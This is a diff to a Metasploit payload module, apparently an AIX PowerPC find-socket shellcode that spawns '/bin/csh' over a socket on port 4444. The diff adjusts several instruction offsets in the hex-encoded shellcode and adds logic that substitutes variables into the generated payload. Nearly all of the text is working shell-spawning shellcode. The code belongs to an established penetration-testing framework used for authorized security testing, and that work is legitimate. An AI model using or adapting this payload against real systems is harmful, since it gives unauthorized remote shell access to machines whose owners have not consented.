@@ -56,10 +56,10 @@ module Metasploit3
 		"\x4c\xc6\x33\x42"     +#   crorc   6,6,6                      #
 		"\x44\xff\xff\x02"     +#   svca    0                          #
 		"\x3b\xde\xff\xf8"     +#   cal     r30,-8(r30)                #
-		"\x3b\xa0\x01\xff"     +#   lil     r29,511                    #
+		"\x3b\xa0\x07\xff"     +#   lil     r29,2047                   #
 		"\x97\xe1\xff\xfc"     +#   stu     r31,-4(r1)                 #
 		"\x7c\x3c\x0b\x78"     +#   mr      r28,r1                     #
-		"\x3b\x7d\xfe\x2d"     +#   cal     r27,-467(r29)              #
+		"\x3b\x7d\xf8\x2d"     +#   cal     r27,-2003(r29)             #
 		"\x97\x61\xff\xfc"     +#   stu     r27,-4(r1)                 #
 		"\x7c\x3b\x0b\x78"     +#   mr      r27,r1                     #
 		"\x3b\xff\x01\xff"     +#   cal     r31,511(r31)               #
@@ -74,7 +74,7 @@ module Metasploit3
 		"\xa3\x5a\xfe\x03"     +#   lhz     r26,-509(r26)              #
 		"\x28\x1a\x11\x5c"     +#   cmpli   0,r26,4444                 #
 		"\x40\x82\xff\xd4"     +#   bne     <fndsockcode+64>           #
-		"\x3b\x3d\xfe\x03"     +#   cal     r25,-509(r29)              #
+		"\x3b\x3d\xf8\x03"     +#   cal     r25,-2045(r29)             #
 		"\x7f\x23\xcb\x78"     +#   mr      r3,r25                     #
 		@cal_close +
 		"\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
@@ -101,6 +101,14 @@ module Metasploit3
 		"\x4e\x80\x04\x21"     +#   bctrl                              #
 		"/bin/csh"
 
+		# If the payload is generated and there are offsets to substitute,
+		# do that now.
+		if (payload and offsets)
+			substitute_vars(payload, offsets)
+		end
+
+		payload
 	end
 
 end
+
